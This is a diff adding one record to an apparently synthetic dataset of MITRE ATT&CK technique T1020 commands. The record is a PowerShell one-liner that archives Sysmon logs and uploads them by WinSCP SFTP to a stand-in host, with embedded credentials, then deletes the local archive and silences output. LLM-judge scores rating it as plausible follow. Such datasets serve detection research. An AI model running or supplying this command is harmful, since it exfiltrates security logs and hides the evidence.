@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1020",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$zip=\"$env:TEMP\\sysmon_$((Get-Date).ToString('yyyyMMdd_HHmmss')).zip\"; Compress-Archive -Path 'C:\\ProgramData\\Sysmon\\*.log' -DestinationPath $zip -Force; $r=\"/incoming/$env:COMPUTERNAME/\"; & 'C:\\Program Files (x86)\\WinSCP\\WinSCP.com' /ini=nul /command 'option batch abort' 'option confirm off' 'open sftp://exfil:S3cr3t!@198.51.100.20/ -hostkey=\"ssh-ed25519 255 SHA256:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=\"' (\"put `\"$zip`\" `\"$r`\" -nopermissions -preservetime -resume\") 'exit' | Out-Null; if($LASTEXITCODE -eq 0){ Remove-Item -Path $zip -Force -ErrorAction SilentlyContinue } 2>$null",
+  "explanation": "Archives Sysmon logs and exfiltrates the archive via SFTP using WinSCP with host key pinning and non-interactive batch options, then cleans up the local archive.",
+  "rationale_steps": [
+    "Package target data to a single archive to reduce transfer artifacts",
+    "Open a non-interactive SFTP session with host key pinning",
+    "Upload the archive with resume and preserved timestamps",
+    "Suppress console output and remove local artifacts on success"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1020-1f3f2541-f756b19b",
+  "source_prompt_hash": "1f3f2541",
+  "timestamp_utc": "2025-09-30T09:07:17.472275Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell one-liner has balanced quoting and escaping, valid separators, and correct WinSCP /command argument structure, making it well-formed and parseable.",
+        "semantic_score": 5,
+        "semantic_justification": "It compresses specified logs, then non-interactively exfiltrates the archive via SFTP with host key pinning and cleanup, which is operationally plausible and aligns with automated exfiltration (T1020).",
+        "combined_score": 5.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T02:57:11.225416Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is well-formed with balanced quotes, proper PowerShell string interpolation, correct use of semicolons as separators, valid escape sequences (backtick for inner quotes), and proper redirection syntax.",
+        "semantic_score": 5,
+        "semantic_justification": "The command fully achieves automated exfiltration (T1020) by timestamping and compressing Sysmon logs via Compress-Archive, transferring the archive to an external SFTP server using WinSCP in non-interactive batch mode with host key pinning, and cleaning up the local artifact on success — all operationally realistic and consistent with the technique description.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2026-02-18T22:21:36.027512Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is well-formed, using correct PowerShell variable expansion, command separators, and proper quoting for the external WinSCP executable call.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly illustrates T1020 by automating the collection/compression of logs, using a scripted third-party transfer tool (WinSCP) with non-interactive flags, and performing post-exfiltration cleanup.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2026-02-18T22:21:47.706568Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 5.0,
+    "llm_average_score": 5.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
